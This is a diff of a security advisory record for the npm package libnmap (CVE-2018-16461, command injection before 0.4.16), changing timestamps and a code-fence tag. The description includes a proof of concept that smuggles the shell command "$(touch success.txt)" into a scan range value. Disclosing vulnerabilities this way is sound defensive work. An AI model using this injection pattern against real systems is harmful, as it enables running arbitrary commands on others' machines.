@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2018-11-01T14:49:59Z",
+  "UpdatedAt": "2023-09-07T18:15:42Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "libnmap"
@@ -36,12 +36,12 @@
         "Value": "CVE-2018-16461"
       }
     ],
-    "Description": "Versions of `libnmap` before 0.4.16 are vulnerable to command injection. \n\nProof of concept\n\n```\nconst nmap = require('libnmap');\nconst opts = {\n    range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n    ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n    for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n    }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.16 or later",
+    "Description": "Versions of `libnmap` before 0.4.16 are vulnerable to command injection. \n\nProof of concept\n\n```js\nconst nmap = require('libnmap');\nconst opts = {\n    range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n    ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n    for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n    }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.16 or later",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-11-01T14:51:33Z",
     "Severity": "MODERATE",
     "Summary": "Command Injection in libnmap",
-    "UpdatedAt": "2023-01-09T05:02:45Z",
+    "UpdatedAt": "2023-09-07T18:15:42Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
